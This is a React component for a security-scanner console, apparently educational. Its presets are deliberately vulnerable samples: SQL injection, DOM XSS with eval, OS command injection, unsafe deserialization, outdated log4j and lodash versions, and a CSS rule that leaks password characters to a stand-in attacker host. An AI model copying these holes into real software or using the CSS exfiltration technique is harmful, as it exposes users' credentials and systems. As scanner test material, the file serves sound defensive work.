/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, ChangeEvent } from "react";
import { Finding, ScanResult } from "../types.ts";
import { ShieldCheck, Terminal, UploadCloud, Play, Code, Box, Globe, Cpu, Loader2, Sparkles, AlertCircle } from "lucide-react";

interface ScanConsoleProps {
  onScanCompleted: (result: ScanResult) => void;
  engineMode: { hasGeminiKey: boolean; text: string };
}

// Preset Code templates to make testing incredibly fun and educational!
const PRESETS = {
  code: [
    {
      title: "Spring Boot - Vulnerable SQLi",
      fileName: "UserController.java",
      content: `package com.monu.threatanalyzer.controller;

import org.springframework.web.bind.annotation.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import java.util.List;

@RestController
@RequestMapping("/api/v1/auth")
public class UserController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @GetMapping("/search")
    public List<User> searchUsers(@RequestParam String query) {
        // VULNERABLE: Direct SQL injection via string concatenation!
        String sql = "SELECT * FROM users WHERE username = '" + query + "' AND is_active = true";
        return jdbcTemplate.query(sql, new UserMapper());
    }
}`
    },
    {
      title: "HTML/JS - DOM Cross-Site Scripting (DOM XSS)",
      fileName: "index.html",
      content: `<!DOCTYPE html>
<html>
<head>
    <title>Dynamic Customer Portal</title>
</head>
<body>
    <h1>Welcome, <span id="portal-user">Partner</span></h1>
    
    <script>
        // CRITICAL: Extract dynamic param directly from URL hash or query route
        const docParams = new URLSearchParams(window.location.hash.substring(1));
        const username = docParams.get("name") || "Guest";
        
        // VULNERABLE: Bypassing browser sanitation, mounting raw inputs directly to the DOM!
        document.getElementById("portal-user").innerHTML = username;
        
        // Unsafe processing sink
        const redirect = docParams.get("onComplete");
        if (redirect) {
            eval(redirect); // EXECUTION DANGER: Execute arbitrary scripts on current tab
        }
    </script>
</body>
</html>`
    },
    {
      title: "HTML - Mixed Transport & Cleartext storage",
      fileName: "login.html",
      content: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Insecure User Gateway</title>
    <!-- VULNERABLE: Insecure active resource downloads over clear HTTP -->
    <script src="http://untrusted-cdn-server.net/assets/analytics.js"></script>
    <link rel="stylesheet" href="http://cdn.sandbox-styles.org/dashboard.css">
</head>
<body>
    <form action="http://insecure-backend-auth.internal/login" method="POST">
        <h3>System Authenticator</h3>
        <input type="password" name="password" placeholder="Passcode">
        <button type="submit">Gateway Unlock</button>
    </form>
    
    <script>
        function saveSession(apiToken) {
            // VULNERABLE: Placing sensitive cleartext authorization variables inside localStorage
            localStorage.setItem("auth_token", apiToken);
        }
    </script>
</body>
</html>`
    },
    {
      title: "CSS - Input Value Selector exfiltration",
      fileName: "custom_styles.css",
      content: `/* VULNERABLE: Attackers targeting conditional input structures to watch keys actions */
input[type="password"][value^="a"] {
    background-image: url("http://attacker-controlled.site/log?key=a");
}
input[type="password"][value^="b"] {
    background-image: url("http://attacker-controlled.site/log?key=b");
}
input[type="password"][value^="c"] {
    background-image: url("http://attacker-controlled.site/log?key=c");
}

body {
    background: var(--theme-picker);
}`
    },
    {
      title: "Java - Deserialization Gadget",
      fileName: "QueueReceiver.java",
      content: `package com.monu.threatanalyzer.service;

import java.io.*;
import java.net.*;

public class QueueReceiver implements Runnable {
    
    private Socket socket;
    
    public QueueReceiver(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void run() {
        try {
            // CRITICAL: Unrestrained deserialization of stream payload
            InputStream is = socket.getInputStream();
            ObjectInputStream ois = new ObjectInputStream(is);
            Object packet = ois.readObject(); 
            processPacket(packet);
        } catch (Exception e) {
            System.err.println("Deserialization stream handler failure");
        }
    }
}`
    },
    {
      title: "Java - OS Command Execution",
      fileName: "DiagnosticsUtil.java",
      content: `package com.monu.threatanalyzer.util;

import java.io.*;

public class DiagnosticsUtil {
    
    // Remote command execution via user variable ping injection!
    public static String runPingCheck(String ipAddress) throws Exception {
        String cmd = "ping -c 3 " + ipAddress;
        Process process = Runtime.getRuntime().exec(cmd);
        
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\\n");
        }
        return output.toString();
    }
}`
    },
    {
      title: "Spring Boot - Secure Database Handler",
      fileName: "SecureUserDAO.java",
      content: `package com.monu.threatanalyzer.service;

import org.springframework.stereotype.Repository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import java.util.Map;
import java.util.HashMap;

@Repository
public class SecureUserDAO {

    @Autowired
    private NamedParameterJdbcTemplate namedJdbcTemplate;

    public User getSecureUser(String username) {
        // SECURE: Strict Parameter Bindings! Concatenations eliminated
        String sql = "SELECT * FROM users WHERE username = :name AND status = 'ACTIVE'";
        Map<String, Object> params = new HashMap<>();
        params.put("name", username);
        
        return namedJdbcTemplate.queryForObject(sql, params, new UserMapper());
    }
}`
    }
  ],
  dependencies: [
    {
      title: "Insecure pom.xml (Maven Log4Shell & Spring4Shell)",
      fileName: "pom.xml",
      content: `<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.monu</groupId>
    <artifactId>threatanalyzer</artifactId>
    <version>1.0.0</version>
    <dependencies>
        <!-- Log4Shell (CVE-2021-44228) -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
        <!-- Spring4Shell compatible core -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>5.3.15</version>
        </dependency>
    </dependencies>
</project>`
    },
    {
      title: "Insecure package.json (NPM Lodash Prototype Pollution)",
      fileName: "package.json",
      content: `{
  "name": "vulnerable-nodejs",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.17.1",
    "axios": "0.19.0",
    "lodash": "4.17.15",
    "jsonwebtoken": "^8.5.1"
  }
}`
    }
  ],
  web: [
    {
      title: "Insecure Portal Simulation",
      url: "http://sloppy-bank-test.org/dev-portal"
    },
    {
      title: "Secure Enterprise Host",
      url: "https://secure-api.intel-shield.io"
    }
  ]
};

export function ScanConsole({ onScanCompleted, engineMode }: ScanConsoleProps) {
  const [activeTab, setActiveTab] = useState<"code" | "dependencies" | "web">("code");
  const [code, setCode] = useState(PRESETS.code[0].content);
  const [fileName, setFileName] = useState(PRESETS.code[0].fileName);
  const [dependenciesText, setDependenciesText] = useState(PRESETS.dependencies[0].content);
  const [fileType, setFileType] = useState("pom.xml");
  const [webUrl, setWebUrl] = useState(PRESETS.web[0].url);

  // Loading indicator states
  const [isScanning, setIsScanning] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Select a preset template
  const handleSelectPreset = (preset: any) => {
    if (activeTab === "code") {
      setCode(preset.content);
      setFileName(preset.fileName);
    } else if (activeTab === "dependencies") {
      setDependenciesText(preset.content);
      setFileType(preset.fileName);
    } else if (activeTab === "web") {
      setWebUrl(preset.url);
    }
  };

  // Drag and drop static file load trigger
  const handleFileUpload = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const text = event.target?.result as string;
      if (activeTab === "code") {
        setCode(text);
        setFileName(file.name);
      } else {
        setDependenciesText(text);
        setFileType(file.name);
      }
    };
    reader.readAsText(file);
  };

  // Run audit triggers
  const executeScan = async () => {
    setIsScanning(true);
    setErrorMsg(null);
    setLogs([]);

    const logSteps = [
      "Initializing localized static application security parser...",
      "Mapping parsing structures to standard rule mappings...",
      activeTab === "code" 
        ? "Constructing syntax indexes and scanning concatenation paths..." 
        : activeTab === "dependencies"
          ? "Vetting library nodes against common CVE database listings..."
          : "Resolving hostname and examining communication protocols...",
      engineMode.hasGeminiKey 
        ? "Leveraging Gemini 3.5 secure models for deep cognitive analysis..." 
        : "Conducting signature scans under advanced local SAST rules...",
      "Matching found indicators against global CWE catalogs...",
      "Finalizing metrics mapping...",
    ];

    // Simulate progressive log triggers for dynamic feedback
    for (let i = 0; i < logSteps.length; i++) {
      setLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${logSteps[i]}`]);
      await new Promise((resolve) => setTimeout(resolve, 350));
    }

    try {
      let endpoint = "/api/scan/code";
      let payload = {};

      if (activeTab === "code") {
        endpoint = "/api/scan/code";
        payload = { code, fileName };
      } else if (activeTab === "dependencies") {
        endpoint = "/api/scan/dependencies";
        payload = { dependenciesText, fileType };
      } else if (activeTab === "web") {
        endpoint = "/api/scan/web";
        payload = { url: webUrl };
      }

      const response = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`Audit Failure: HTTP Status ${response.status}`);
      }

      const scanResult: ScanResult = await response.json();
      onScanCompleted(scanResult);
    } catch (err: any) {
      console.error(err);
      setErrorMsg(err?.message || "Internal connection failure to threat scanning service.");
    } finally {
      setIsScanning(false);
    }
  };

  return (
    <div id="scan_console_wrapper" className="space-y-6">
      {/* Title block */}
      <div>
        <h2 className="text-2xl font-extrabold text-zinc-100 tracking-tight flex items-center gap-2">
          <Cpu className="text-blue-400" size={24} /> Threat Scanning Hub
        </h2>
        <p className="text-zinc-400 text-xs mt-1">
          Perform immediate risk analysis using our local static checkrules or connect a secure Gemini key to unleash advanced semantic AI remediation suggestions.
        </p>
      </div>

      {/* Mode Status Badge */}
      <div className="p-3 bg-zinc-950/80 border border-zinc-850 rounded-lg flex items-center justify-between">
        <div className="flex items-center gap-2">
          {engineMode.hasGeminiKey ? (
            <span className="flex h-2.5 w-2.5 relative">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
            </span>
          ) : (
            <span className="h-2.5 w-2.5 rounded-full bg-blue-500" />
          )}
          <span className="text-xs font-mono text-zinc-300">
            Engine Mode: <strong className="text-zinc-100 font-semibold">{engineMode.text}</strong>
          </span>
        </div>
        {engineMode.hasGeminiKey ? (
          <span className="text-[10px] bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 px-2 py-0.5 rounded font-bold font-mono uppercase flex items-center gap-1">
            <Sparkles size={10} /> AI Enhanced
          </span>
        ) : (
          <span className="text-[10px] bg-blue-500/10 border border-blue-500/30 text-blue-400 px-2 py-0.5 rounded font-bold font-mono uppercase">
            Signature Mode
          </span>
        )}
      </div>

      {/* Scanning Tabs selection */}
      <div className="border-b border-zinc-850 flex gap-2">
        <button
          onClick={() => {
            setActiveTab("code");
            setFileName(PRESETS.code[0].fileName);
            setCode(PRESETS.code[0].content);
            setErrorMsg(null);
          }}
          className={`pb-3 px-4 font-bold text-sm transition-all flex items-center gap-1.5 border-b-2 cursor-pointer ${
            activeTab === "code"
              ? "border-zinc-100 text-zinc-100"
              : "border-transparent text-zinc-500 hover:text-zinc-350"
          }`}
          disabled={isScanning}
        >
          <Code size={16} /> Source Code Scan
        </button>
        <button
          onClick={() => {
            setActiveTab("dependencies");
            setFileType(PRESETS.dependencies[0].fileName);
            setDependenciesText(PRESETS.dependencies[0].content);
            setErrorMsg(null);
          }}
          className={`pb-3 px-4 font-bold text-sm transition-all flex items-center gap-1.5 border-b-2 cursor-pointer ${
            activeTab === "dependencies"
              ? "border-zinc-100 text-zinc-100"
              : "border-transparent text-zinc-500 hover:text-zinc-350"
          }`}
          disabled={isScanning}
        >
          <Box size={16} /> Dependency Manifests
        </button>
        <button
          onClick={() => {
            setActiveTab("web");
            setWebUrl(PRESETS.web[0].url);
            setErrorMsg(null);
          }}
          className={`pb-3 px-4 font-bold text-sm transition-all flex items-center gap-1.5 border-b-2 cursor-pointer ${
            activeTab === "web"
              ? "border-zinc-100 text-zinc-100"
              : "border-transparent text-zinc-500 hover:text-zinc-350"
          }`}
          disabled={isScanning}
        >
          <Globe size={16} /> Web Application URL
        </button>
      </div>

      {/* Dynamic Content forms */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-4">
          {activeTab === "code" && (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-zinc-400 font-mono">CODE TO AUDIT</label>
                <input
                  type="text"
                  value={fileName}
                  onChange={(e) => setFileName(e.target.value)}
                  placeholder="fileName.java"
                  className="px-2 py-1 bg-zinc-950 text-zinc-200 border border-zinc-800 text-xs font-mono rounded w-44 focus:ring-1 focus:ring-zinc-650"
                  disabled={isScanning}
                />
              </div>
              <textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                rows={16}
                className="w-full bg-zinc-950 text-zinc-200 p-4 font-mono text-xs border border-zinc-850 rounded-xl focus:outline-none focus:ring-1 focus:ring-zinc-650 h-[380px] leading-relaxed resize-none"
                placeholder="Paste your source files (Java, JavaScript, Thymeleaf, XML) or select a preset to begin..."
                disabled={isScanning}
              />
            </div>
          )}

          {activeTab === "dependencies" && (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-zinc-400 font-mono">MANIFEST SOURCE</label>
                <input
                  type="text"
                  value={fileType}
                  onChange={(e) => setFileType(e.target.value)}
                  placeholder="package.json or pom.xml"
                  className="px-2 py-1 bg-zinc-950 text-zinc-200 border border-zinc-805 text-xs font-mono rounded w-44 focus:ring-1 focus:ring-zinc-650"
                  disabled={isScanning}
                />
              </div>
              <textarea
                value={dependenciesText}
                onChange={(e) => setDependenciesText(e.target.value)}
                rows={16}
                className="w-full bg-zinc-950 text-zinc-200 p-4 font-mono text-xs border border-zinc-850 rounded-xl focus:outline-none focus:ring-1 focus:ring-zinc-650 h-[380px] leading-relaxed resize-none"
                placeholder="Paste dynamic dependency listings, maven packages xml configurations or packagers json dependencies blocks..."
                disabled={isScanning}
              />
            </div>
          )}

          {activeTab === "web" && (
            <div className="space-y-3">
              <label className="text-xs font-bold text-zinc-400 block font-mono">TARGET NETWORK URL</label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={webUrl}
                  onChange={(e) => setWebUrl(e.target.value)}
                  placeholder="https://my-secured-website.com"
                  className="flex-1 bg-zinc-950 text-zinc-200 border border-zinc-850 p-3 text-sm rounded-xl focus:outline-none focus:ring-1 focus:ring-zinc-650 font-mono"
                  disabled={isScanning}
                />
              </div>
              <div className="p-4 bg-zinc-950/40 border border-zinc-850 rounded-xl space-y-2">
                <span className="text-xs font-semibold text-zinc-350 block">Audit Capabilities Activated:</span>
                <ul className="text-xs text-zinc-500 space-y-1 font-mono list-disc list-inside">
                  <li>SSL / TLS certificate bind compliance validation.</li>
                  <li>Insecure communication fallback redirection check.</li>
                  <li>Passive web headers analysis (CSP, HSTS, X-Frame-Options).</li>
                  <li>Simulated crawler directories auditing for index leaks.</li>
                </ul>
              </div>
            </div>
          )}

          {/* Controls Trigger block */}
          <div className="flex items-center gap-3">
            <button
              onClick={executeScan}
              disabled={isScanning}
              id="btn_trigger_threat_scan"
              className="flex-1 py-3.5 bg-zinc-100 hover:bg-zinc-200 text-zinc-950 font-bold rounded-xl transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md shadow-zinc-100/10 disabled:opacity-40"
            >
              {isScanning ? (
                <>
                  <Loader2 className="animate-spin" size={18} /> Processing Audit...
                </>
              ) : (
                <>
                  <Play size={16} fill="currentColor" /> Run Thread Scan Audit
                </>
              )}
            </button>

            {/* Custom file drag load button */}
            {activeTab !== "web" && (
              <label className="p-3.5 border border-zinc-800 hover:border-zinc-750 bg-zinc-900 text-zinc-300 hover:text-zinc-100 rounded-xl cursor-pointer transition-all flex items-center justify-center gap-2">
                <UploadCloud size={18} />
                <input
                  type="file"
                  onChange={handleFileUpload}
                  className="hidden"
                  accept={activeTab === "code" ? ".java,.js,.jsx,.ts,.tsx,.xml" : ".json,.xml,.txt"}
                  disabled={isScanning}
                />
              </label>
            )}
          </div>
        </div>

        {/* Audit Sample Preset Picker */}
        <div className="space-y-4">
          <span className="text-xs font-extrabold text-zinc-400 uppercase tracking-wider block font-mono">
            Audit Templates
          </span>

          <div className="space-y-3">
            {activeTab === "code" && 
              PRESETS.code.map((p, idx) => (
                <button
                  key={idx}
                  onClick={() => handleSelectPreset(p)}
                  disabled={isScanning}
                  className="w-full text-left p-4 bg-zinc-900 hover:bg-zinc-850 border border-zinc-800 hover:border-zinc-700 rounded-xl transition-all cursor-pointer group flex flex-col space-y-1"
                >
                  <span className="text-sm font-semibold text-zinc-200 group-hover:text-zinc-100 block">
                    {p.title}
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500 block truncate">
                    {p.fileName}
                  </span>
                </button>
              ))
            }

            {activeTab === "dependencies" && 
              PRESETS.dependencies.map((p, idx) => (
                <button
                  key={idx}
                  onClick={() => handleSelectPreset(p)}
                  disabled={isScanning}
                  className="w-full text-left p-4 bg-zinc-900 hover:bg-zinc-850 border border-zinc-800 hover:border-zinc-700 rounded-xl transition-all cursor-pointer group flex flex-col space-y-1"
                >
                  <span className="text-sm font-semibold text-zinc-200 group-hover:text-zinc-100 block">
                    {p.title}
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500 block">
                    {p.fileName}
                  </span>
                </button>
              ))
            }

            {activeTab === "web" && 
              PRESETS.web.map((p, idx) => (
                <button
                  key={idx}
                  onClick={() => handleSelectPreset(p)}
                  disabled={isScanning}
                  className="w-full text-left p-4 bg-zinc-900 hover:bg-zinc-850 border border-zinc-800 hover:border-zinc-700 rounded-xl transition-all cursor-pointer group flex flex-col space-y-1"
                >
                  <span className="text-sm font-semibold text-zinc-200 group-hover:text-zinc-100 block truncate">
                    {p.title}
                  </span>
                  <span className="text-[11px] font-mono text-zinc-500 block truncate">
                    {p.url}
                  </span>
                </button>
              ))
            }
          </div>

          {/* Interactive Logs Output Feed */}
          {logs.length > 0 && (
            <div className="p-4 bg-zinc-950 border border-zinc-850 rounded-xl space-y-3 font-mono">
              <span className="text-[11px] font-extrabold text-blue-450 uppercase flex items-center gap-1">
                <Terminal size={12} /> Execution Logs
              </span>

              <div className="text-[10px] text-zinc-400 space-y-1.5 h-[130px] overflow-y-auto leading-relaxed">
                {logs.map((log, index) => (
                  <div key={index} className="transition-all duration-300">
                    <span className="text-zinc-650 select-none">❯</span> {log}
                  </div>
                ))}
              </div>
            </div>
          )}

          {errorMsg && (
            <div className="p-4 bg-rose-950/20 border border-rose-900/40 rounded-xl text-rose-450 text-xs flex items-center gap-2 animate-pulse leading-relaxed">
              <AlertCircle size={16} className="shrink-0" />
              <span>{errorMsg}</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
